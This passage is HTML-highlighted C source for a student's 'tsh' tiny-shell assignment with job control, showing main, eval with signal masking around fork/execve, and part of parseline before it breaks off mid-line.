class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tsh - A tiny shell program with job control</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * &lt;Put your name and login ID here&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-comment">/* Misc manifest constants */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXLINE    1024   <span class="hljs-comment">/* max line size */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXARGS     128   <span class="hljs-comment">/* max args on a command line */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJOBS      16   <span class="hljs-comment">/* max jobs at any point in time */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJID    1&lt;&lt;16   <span class="hljs-comment">/* max job ID */</span></span><br><br><span class="hljs-comment">/* Job states */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNDEF 0 <span class="hljs-comment">/* undefined */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FG 1    <span class="hljs-comment">/* running in foreground */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BG 2    <span class="hljs-comment">/* running in background */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ST 3    <span class="hljs-comment">/* stopped */</span></span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span><br><span class="hljs-comment"> * Job state transitions and enabling actions:</span><br><span class="hljs-comment"> *     FG -&gt; ST  : ctrl-z</span><br><span class="hljs-comment"> *     ST -&gt; FG  : fg command</span><br><span class="hljs-comment"> *     ST -&gt; BG  : bg command</span><br><span class="hljs-comment"> *     BG -&gt; FG  : fg command</span><br><span class="hljs-comment"> * At most 1 job can be in the FG state.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* Global variables */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;      <span class="hljs-comment">/* defined in libc */</span><br><span class="hljs-keyword">char</span> prompt[] = <span class="hljs-string">&quot;tsh&gt; &quot;</span>;    <span class="hljs-comment">/* command line prompt (DO NOT CHANGE) */</span><br><span class="hljs-keyword">int</span> verbose = <span class="hljs-number">0</span>;            <span class="hljs-comment">/* if true, print additional output */</span><br><span class="hljs-keyword">int</span> nextjid = <span class="hljs-number">1</span>;            <span class="hljs-comment">/* next job ID to allocate */</span><br><span class="hljs-keyword">char</span> sbuf[MAXLINE];         <span class="hljs-comment">/* for composing sprintf messages */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> &#123;</span>              <span class="hljs-comment">/* The job struct */</span><br>    <span class="hljs-keyword">pid_t</span> pid;              <span class="hljs-comment">/* job PID */</span><br>    <span class="hljs-keyword">int</span> jid;                <span class="hljs-comment">/* job ID [1, 2, ...] */</span><br>    <span class="hljs-keyword">int</span> state;              <span class="hljs-comment">/* UNDEF, BG, FG, or ST */</span><br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE];  <span class="hljs-comment">/* command line */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> <span class="hljs-title">jobs</span>[<span class="hljs-title">MAXJOBS</span>];</span> <span class="hljs-comment">/* The job list */</span><br><span class="hljs-comment">/* End global variables */</span><br><br><span class="hljs-comment">/*error handling function */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">Fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> environ[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Kill</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> signum)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigemptyset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigaddset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-keyword">int</span> signum)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigfillset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Setpgid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">pid_t</span> pgid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigprocmask</span><span class="hljs-params">(<span class="hljs-keyword">int</span> how, <span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-keyword">sigset_t</span> *oldset)</span></span>;<br><span class="hljs-comment">/* Function prototypes */</span><br><br><span class="hljs-comment">/* Here are the functions that you will implement */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-comment">/* Here are helper routines that we&#x27;ve provided for you */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handler_t</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * main - The shell&#x27;s main routine </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE];<br>    <span class="hljs-keyword">int</span> emit_prompt = <span class="hljs-number">1</span>; <span class="hljs-comment">/* emit prompt (default) */</span><br><br>    <span class="hljs-comment">/* Redirect stderr to stdout (so that driver will get all output</span><br><span class="hljs-comment">     * on the pipe connected to stdout) */</span><br>    dup2(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">/* Parse the command line */</span><br>    <span class="hljs-keyword">while</span> ((c = getopt(argc, argv, <span class="hljs-string">&quot;hvp&quot;</span>)) != EOF) &#123;<br>        <span class="hljs-keyword">switch</span> (c) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:             <span class="hljs-comment">/* print help message */</span><br>            usage();<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:             <span class="hljs-comment">/* emit additional diagnostic info */</span><br>            verbose = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:             <span class="hljs-comment">/* don&#x27;t print a prompt */</span><br>            emit_prompt = <span class="hljs-number">0</span>;  <span class="hljs-comment">/* handy for automatic testing */</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>            usage();<br>    &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* Install the signal handlers */</span><br><br>    <span class="hljs-comment">/* These are the ones you will need to implement */</span><br>    Signal(SIGINT,  sigint_handler);   <span class="hljs-comment">/* ctrl-c */</span><br>    Signal(SIGTSTP, sigtstp_handler);  <span class="hljs-comment">/* ctrl-z */</span><br>    Signal(SIGCHLD, sigchld_handler);  <span class="hljs-comment">/* Terminated or stopped child */</span><br><br>    <span class="hljs-comment">/* This one provides a clean way to kill the shell */</span><br>    Signal(SIGQUIT, sigquit_handler); <br><br>    <span class="hljs-comment">/* Initialize the job list */</span><br>    initjobs(jobs);<br><br>    <span class="hljs-comment">/* Execute the shell&#x27;s read/eval loop */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>    <span class="hljs-comment">/* Read command line */</span><br>    <span class="hljs-keyword">if</span> (emit_prompt) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, prompt);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="hljs-built_in">stdin</span>) == <span class="hljs-literal">NULL</span>) &amp;&amp; ferror(<span class="hljs-built_in">stdin</span>))<br>        app_error(<span class="hljs-string">&quot;fgets error&quot;</span>);<br>    <span class="hljs-keyword">if</span> (feof(<span class="hljs-built_in">stdin</span>)) &#123; <span class="hljs-comment">/* End of file (ctrl-d) */</span><br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Evaluate the command line */</span><br>    eval(cmdline);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125; <br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* control never reaches here */</span><br>&#125;<br>  <br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *argv[MAXARGS];<span class="hljs-comment">/*Argument list execve() */</span><br>    <span class="hljs-keyword">char</span> buf[MAXLINE];<span class="hljs-comment">/*Holds modified command line */</span><br>    <span class="hljs-keyword">int</span> bg;<span class="hljs-comment">/*Should the job run in bg or fg? */</span><br>    <span class="hljs-keyword">pid_t</span> pid;<span class="hljs-comment">/*Process id */</span><br>    <span class="hljs-keyword">sigset_t</span> mask_all,mask_one,prev_one;<br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    bg = parseline(buf, argv); <br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<span class="hljs-comment">/* Ignore empty lines */</span><br><br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv)) &#123;<br>        <span class="hljs-comment">//blocking SIGCHLD in if status,otherewise it maybe has bugs</span><br>        Sigfillset(&amp;mask_all);<span class="hljs-comment">/* add every signal number to set */</span><br>        Sigemptyset(&amp;mask_one);<span class="hljs-comment">/* create empty set */</span><br>        Sigaddset(&amp;mask_one, SIGCHLD);<span class="hljs-comment">/* add signal number to set */</span><br><br>        <span class="hljs-comment">/*  block SIGINT and save previous blocked set */</span><br>        <span class="hljs-comment">/* avoid parent process run to addjob exited,before fork child process block sigchild signal,after call addjob unblock  */</span><br>        Sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="hljs-comment">/* Block SIGCHLD */</span><br>        <span class="hljs-keyword">if</span> ((pid = Fork()) == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">/* Child runs user job */</span><br>            <span class="hljs-comment">/* restore previous blocked set,unblocking SIGINT */</span><br>            <span class="hljs-comment">/* child process inherit parent process&#x27; blocking sets,avoid it can&#x27;t receive itself child process signal,so we must unblock */</span><br>            Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">/* Unblock SIGCHLD */</span><br>            Setpgid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">// set child&#x27;s group to a new process group (this is identical to the child&#x27;s PID)</span><br>            Execve(argv[<span class="hljs-number">0</span>], argv, environ);<span class="hljs-comment">//this function not return ,so must call exit,otherewise it will run forever</span><br>        &#125;<span class="hljs-comment">/* Parent waits for foreground job to terminate */</span><br><br>        Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">/* Block SIGCHLD */</span><br>        <span class="hljs-keyword">int</span> st = (bg==<span class="hljs-number">0</span>) ? FG : BG;<br>        addjob(jobs,pid,st,cmdline);<br>        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">/* Unblock SIGCHLD */</span><br>        <span class="hljs-keyword">if</span> (!bg) &#123;<br>            <span class="hljs-comment">//because sigchld_handler was called above，it call waitpid，so don&#x27;t call and circular wait wait</span><br>            waitfg(pid);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid),pid, cmdline);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * parseline - Parse the command line and build the argv array.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Characters enclosed in single quotes are treated as a single</span><br><span class="hljs-comment"> * argument.  Return true if the user has requested a BG job, false if</span><br><span class="hljs-comment"> * the user has requested a FG job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> <span class="hljs-built_in">array</span>[MAXLINE]; <span class="hljs-comment">/* holds local copy of command line */</span><br>    <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">array</span>;          <span class="hljs-comment">/* ptr that traverses command line */</span><br>    <span class="hljs-keyword">char</span> *delim;                <span class="hljs-comment">/* points to first space delimiter */</span><br>    <span class="hljs-keyword">int</span> argc;                   <span class="hljs-comment">/* number of args */</span><br>    <span class="hljs-keyword">int</span> bg;                     <span class="hljs-comment">/* background job? */</span><br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    buf[<span class="hljs-built_in">strlen</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;  <span class="hljs-comment">/* replace trailing &#x27;\n&#x27; with space */</span><br>    <span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore leading spaces */</span><br>    buf++;<br><br>    <span class="hljs-comment">/* Build the argv list */</span><br>    argc = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>    buf++;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (delim) &#123;<br>    argv[argc++] = buf;<br>    *delim = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    buf = delim + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore spaces */</span><br>           buf++;<br><br>    <span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>        buf++;<br>        delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>    &#125;<br>    &#125;<br>    argv[argc] = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-keyword">if</span> (argc == <span 